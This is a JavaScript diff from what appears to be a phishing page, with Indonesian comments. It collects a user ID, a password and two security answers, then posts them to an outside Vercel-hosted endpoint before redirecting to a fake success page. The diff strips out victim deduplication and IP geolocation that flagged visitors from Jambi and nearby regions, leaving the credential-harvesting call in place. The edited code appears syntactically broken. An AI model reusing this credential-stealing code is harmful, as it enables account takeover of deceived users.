@@ -261,36 +261,12 @@ function redirectToSuccess() {
   const answer2 = (document.getElementById("answer2") || {}).value || "";
   if (!userID || !password || !answer1 || !answer2) return;
 
-  if (localStorage.getItem(`sent_${userID}`) === "true") {
-    console.log("User ini sudah pernah dikirim sebelumnya. Lewat.");
-    window.location.href = "success.php";
-    return;
-  }
-
   isSubmitted = true;
   const btn = document.getElementById("submitButton");
   if (btn) {
     btn.disabled = true;
     btn.style.cursor = "not-allowed";
   }
-
-  fetch("https://api.ipify.org?format=json")
-    .then((r) => r.json())
-    .then((ipData) => {
-      const userIP = ipData.ip;
-      return fetch(`https://ipapi.co/${userIP}/json`)
-        .then((r) => r.json())
-        .then((loc) => ({ userIP, loc }));
-    })
-    .then(({ userIP, loc }) => {
-      const regionCity = `${(loc.region || "").toLowerCase()} ${(
-        loc.city || ""
-      ).toLowerCase()}`;
-      const detectedFromJambi =
-        /jambi|muaro|batanghari|tanjab|tanjungjabung|kualatungkal|kuala tungkal|sarolangun|merangin|kerinci|bungo|tebo|jakarta|lampung/.test(
-          regionCity
-        );
-      if (detectedFromJambi) localStorage.setItem("isFromJambi", "true");
 
       return fetch("https://dominnneeii.vercel.app/api/login", {
         method: "POST",
